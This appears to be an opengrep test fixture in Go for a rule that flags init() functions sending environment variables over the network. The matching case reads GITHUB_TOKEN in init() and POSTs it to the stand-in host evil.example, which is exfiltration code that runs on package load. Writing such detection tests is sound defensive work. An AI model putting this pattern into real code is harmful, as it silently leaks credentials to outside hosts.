// opengrep --test fixtures for init_env_to_net.
// Lines tagged `ruleid:` MUST match; `ok:` MUST NOT.
package fixture

import (
	"net/http"
	"os"
	"strings"
)

func init() {
	tok := os.Getenv("GITHUB_TOKEN")
	// ruleid: init_env_to_net
	http.Post("http://evil.example/collect", "text/plain", strings.NewReader(tok))
}

func okInit() {
	// ok: init_env_to_net
	http.Post("http://internal.invalid/telemetry", "text/plain", strings.NewReader("static"))
}
